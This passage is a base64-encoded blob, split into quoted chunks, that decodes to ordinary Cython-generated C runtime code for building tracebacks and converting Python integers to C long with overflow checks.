FB5RnJhbWVPYmplY3QgKnB5X2ZyYW1lID0gMDsKICAgIFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSA9IF9fUHl4X1B5VGhyZWFkU3RhdGVfQ3VycmVudDsKICAgIFB5T2JqZWN0ICpwdHlwZSwgKnB2YWx1ZSwgKnB0cmFjZWJhY2s7CiAgICBpZiAoY19saW5lKSB7CiAgICAgICAgY19saW5lID0gX19QeXhfQ0xpbmVGb3JUcmFjZWJhY2sodHN0YXRlLCBjX2xpbmUpOwogICAgfQogICAgcHlfY29kZSA9IF9fcHl4X2ZpbmRfY29kZV9vYmplY3QoY19saW5lID8gLWNfbGluZSA6IHB5X2xpbmUpOwogICAgaWYgKCFweV9jb2RlKSB7CiAgICAgICAgX19QeXhfRXJyRmV0Y2hJblN0YXRlKHRzdGF0ZSwgJnB0eXBlLCAmcHZhbHVlLCAmcHRyYWNlYmFjayk7CiAgICAgICAgcHlfY29kZSA9IF9fUHl4X0NyZWF0ZUNvZGVPYmplY3RGb3JUcmFjZWJhY2soCiAgICAgICAgICAgIGZ1bmNuYW1lLCBjX2xpbmUsIHB5X2xpbmUsIGZpbGVuYW1lKTsKICAgICAgICBpZiAoIXB5X2NvZGUpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgIFB5X1hERUNSRUYocHR5cGUpOwogICAgICAgICAgICBQeV9YREVDUkVGKHB2YWx1ZSk7CiAgICAgICAgICAgIFB5X1hERUNSRUYocHRyYWNlYmFjayk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHB0eXBlLCBwdmFsdWUsIHB0cmFjZWJhY2spOwogICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgcHlfY29kZSk7CiAgICB9CiAgICBweV9mcmFtZSA9IFB5RnJhbWVfTmV3KAogICAgICAgIHRzdGF0ZSwgICAgICAgICAgICAKICAgICAgICBweV9jb2RlLCAgICAgICAgICAgCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgICAgCiAgICAgICAgMCAgICAgICAgICAgICAgICAgIAogICAgKTsKICAgIGlmICghcHlfZnJhbWUpIGdvdG8gYmFkOwogICAgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKHB5X2ZyYW1lLCBweV9saW5lKTsKICAgIFB5VHJhY2VCYWNrX0hlcmUocHlfZnJhbWUpOwpiYWQ6CiAgICBQeV9YREVDUkVGKHB5X2NvZGUpOwogICAgUHlfWERFQ1JFRihweV9mcmFtZSk7Cn0KI2VuZGlmCgoKI2RlZmluZSBfX1BZ""WF9WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVwKICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAwKQojZGVmaW5lIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlKVwKICAgIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCAxKQojZGVmaW5lIF9fUFlYX19WRVJJRllfUkVUVVJOX0lOVCh0YXJnZXRfdHlwZSwgZnVuY190eXBlLCBmdW5jX3ZhbHVlLCBleGMpXAogICAge1wKICAgICAgICBmdW5jX3R5cGUgdmFsdWUgPSBmdW5jX3ZhbHVlO1wKICAgICAgICBpZiAoc2l6ZW9mKHRhcmdldF90eXBlKSA8IHNpemVvZihmdW5jX3R5cGUpKSB7XAogICAgICAgICAgICBpZiAodW5saWtlbHkodmFsdWUgIT0gKGZ1bmNfdHlwZSkgKHRhcmdldF90eXBlKSB2YWx1ZSkpIHtcCiAgICAgICAgICAgICAgICBmdW5jX3R5cGUgemVybyA9IDA7XAogICAgICAgICAgICAgICAgaWYgKGV4YyAmJiB1bmxpa2VseSh2YWx1ZSA9PSAoZnVuY190eXBlKS0xICYmIFB5RXJyX09jY3VycmVkKCkpKVwKICAgICAgICAgICAgICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSAtMTtcCiAgICAgICAgICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkodmFsdWUgPCB6ZXJvKSlcCiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7XAogICAgICAgICAgICAgICAgZWxzZVwKICAgICAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX292ZXJmbG93O1wKICAgICAgICAgICAgfVwKICAgICAgICB9XAogICAgICAgIHJldHVybiAodGFyZ2V0X3R5cGUpIHZhbHVlO1wKICAgIH0KCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBsb25nIF9fUHl4X1B5TG9uZ19Bc19sb25nKFB5T2JqZWN0ICp4KSB7CiNpZmRlZiBfX1B5eF9IQVNfR0NDX0RJQUdOT1NUSUMKI3ByYWdtYSBHQ0MgZGlhZ25vc3RpYyBwdXNoCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgaWdub3JlZCAiLVdjb252ZXJzaW9uIgojZW5kaWYKICAgIGNvbnN0IGxvbmcgbmVnX29uZSA9IChsb25nKSAtMSwgY29uc3RfemVybyA9IChsb25nKSAwOwojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcG9wCiNlbmRpZgogICAgY29uc3QgaW50IGlzX3Vuc2lnbmVkID0gbmVnX29uZSA+IGNvbnN0X3plcm87CiAgICBpZiAodW5saWtlbHkoIVB5TG9uZ19DaGVjayh4KSkpIHsKICAgICAgICBsb25nIHZhbDsKICAgICAgICBQeU9iamVjdCAqdG1wID0gX19QeXhfUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICBpZiAoIXRtcCkgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICB2YWwgPSBfX1B5eF9QeUxvbmdfQXNfbG9uZyh0bXApOwogICAgICAgIFB5X0RFQ1JFRih0bXApOwogICAgICAgIHJldHVybiB2YWw7CiAgICB9""CiAgICBpZiAoaXNfdW5zaWduZWQpIHsKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNOZWcoeCkpKSB7CiAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93OwogICAgICAgIH0gZWxzZSBpZiAoX19QeXhfUHlMb25nX0lzQ29tcGFjdCh4KSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBfX1B5eF9jb21wYWN0X3VweWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWVVbnNpZ25lZCh4KSkKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICBjb25zdCBkaWdpdCogZGlnaXRzID0gX19QeXhfUHlMb25nX0RpZ2l0cyh4KTsKICAgICAgICAgICAgYXNzZXJ0KF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpID4gMSk7CiAgICAgICAgICAgIHN3aXRjaCAoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkpIHsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAg""ICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDQ6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgPj0gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgfQogICAgICAgIH0KI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPCAweDAzMEMwMEE3CiAgICAgICAgaWYgKHVubGlrZWx5KFB5X1NJWkUoeCkgPCAwKSkgewogICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbHNlCiAgICAgICAgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHgsIFB5X0ZhbHNlLCBQeV9MVCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkKICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gMSkpCiAgICAgICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIGxvbmcsIFB5TG9uZ19Bc1Vuc2ln""bmVkTG9uZyh4KSkKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSkgewogICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEMobG9uZywgdW5zaWduZWQgUFlfTE9OR19MT05HLCBQeUxvbmdfQXNVbnNpZ25lZExvbmdMb25nKHgpKQojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewojaWYgQ1lUSE9OX1VTRV9QWUxPTkdfSU5URVJOQUxTCiAgICAgICAgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgX19QeXhfY29tcGFjdF9weWxvbmcsIF9fUHl4X1B5TG9uZ19Db21wYWN0VmFsdWUoeCkpCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7CiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpOwogICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19TaWduZWREaWdpdENvdW50KHgpKSB7CiAgICAgICAgICAgICAgICBjYXNlIC0yOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgbG9uZywgLShsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAxICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAg""ICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgobG9uZyktMSkqKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAzOgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRz""WzBdKSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSAtNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gNCAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKChsb25nKS0xKSooKCgoKCgoKChsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgNDoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKCgoKCgobG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylk""aWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgogICAgICAgIGlmICgoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZihsb25nKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIGxvbmcsIFB5TG9uZ19Bc0xvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YoUFlfTE9OR19MT05HKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzTG9uZ0xvbmcoeCkpCiNlbmRpZgogICAgICAgIH0KICAgIH0KICAgIHsKICAgICAgICBsb25nIHZhbDsKICAgICAgICBpbnQgcmV0ID0gLTE7CiNpZiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMGQwMEE2ICYmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICAgICAgUHlfc3NpemVfdCBieXRlc19jb3BpZWQgPSBQeUxvbmdfQXNOYXRpdmVCeXRlcygKICAgICAgICAgICAgeCwgJnZhbCwgc2l6ZW9mKHZhbCksIFB5X0FTTkFUSVZFQllURVNfTkFUSVZFX0VORElBTiB8IChpc191bnNpZ25lZCA/IFB5X0FTTkFUSVZFQllURVNfVU5TSUdORURfQlVGRkVSIHwgUHlfQVNOQVRJVkVCWVRFU19SRUpFQ1RfTkVHQVRJVkUgOiAwKSk7CiAgICAgICAgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA9PSAtMSkpIHsKICAgICAgICB9IGVsc2UgaWYgKHVubGlrZWx5KGJ5dGVzX2NvcGllZCA+IChQeV9zc2l6ZV90KSBzaXplb2YodmFsKSkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdzsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXQgPSAwOwogICAgICAgIH0KI2VsaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMGQwMDAwICYmICEoQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkpIHx8IGRlZmluZWQoX1B5TG9uZ19Bc0J5dGVBcnJheSkKICAgICAgICBpbnQgb25lID0gMTsgaW50IGlzX2xpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICB1bnNpZ25lZCBjaGFyICpieXRlcyA9ICh1bnNpZ25lZCBjaGFyICopJnZhbDsKICAgICAgICByZXQgPSBfUHlMb25nX0FzQnl0ZUFycmF5KChQeUxvbmdPYmplY3QgKil4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBieXRlcywgc2l6ZW9mKHZhbCksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlzX2xpdHRsZSwgIWlzX3Vuc2lnbmVkKTsKI2Vsc2UKICAgICAgICBQeU9iamVjdCAqdjsKICAgICAgICBQeU9iamVjdCAqc3RlcHZhbCA9IE5VTEwsICptYXNrID0gTlVMTCwgKnNoaWZ0ID0gTlVMTDsKICAgICAgICBpbnQgYml0cywgcmVtYWluaW5nX2JpdHMsIGlzX25l""Z2F0aXZlID0gMDsKICAgICAgICBpbnQgY2h1bmtfc2l6ZSA9IChzaXplb2YobG9uZykgPCA4KSA/IDMwIDogNjI7CiAgICAgICAgaWYgKGxpa2VseShQeUxvbmdfQ2hlY2tFeGFjdCh4KSkpIHsKICAgICAgICAgICAgdiA9IF9fUHl4X05ld1JlZih4KTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICB2ID0gUHlOdW1iZXJfTG9uZyh4KTsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KCF2KSkgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICAgICAgYXNzZXJ0KFB5TG9uZ19DaGVja0V4YWN0KHYpKTsKICAgICAgICB9CiAgICAgICAgewogICAgICAgICAgICBpbnQgcmVzdWx0ID0gUHlPYmplY3RfUmljaENvbXBhcmVCb29sKHYsIFB5X0ZhbHNlLCBQeV9MVCk7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShyZXN1bHQgPCAwKSkgewogICAgICAgICAgICAgICAgUHlfREVDUkVGKHYpOwogICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAtMTsKICAgICAgICAgICAgfQogICAgICAgICAgICBpc19uZWdhdGl2ZSA9IHJlc3VsdCA9PSAxOwogICAgICAgIH0KICAgICAgICBpZiAoaXNfdW5zaWduZWQgJiYgdW5saWtlbHkoaXNfbmVnYXRpdmUpKSB7CiAgICAgICAgICAgIFB5X0RFQ1JFRih2KTsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfSBlbHNlIGlmIChpc19uZWdhdGl2ZSkgewogICAgICAgICAgICBzdGVwdmFsID0gUHlOdW1iZXJfSW52ZXJ0KHYpOwogICAgICAgICAgICBQeV9ERUNSRUYodik7CiAgICAgICAgICAgIGlmICh1bmxpa2VseSghc3RlcHZhbCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHN0ZXB2YWwgPSB2OwogICAgICAgIH0KICAgICAgICB2ID0gTlVMTDsKICAgICAgICB2YWwgPSAobG9uZykgMDsKIC